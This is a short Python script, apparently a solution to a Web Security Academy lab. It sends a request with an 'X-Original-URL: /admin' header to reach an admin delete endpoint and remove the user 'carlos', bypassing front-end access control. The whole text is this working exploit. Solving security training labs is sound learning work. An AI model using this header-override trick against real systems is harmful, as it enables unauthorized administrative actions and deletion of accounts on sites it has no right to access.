import requests
'from bs4 import BeautifulSoup'
s = requests.Session()

site = 'acdf1fb51efef3248026336900e000df.web-security-academy.net'

url = f'https://{site}/delete?username=carlos'
resp = s.get(url, headers = {'X-Original-URL' : '/admin'})
print(resp.text)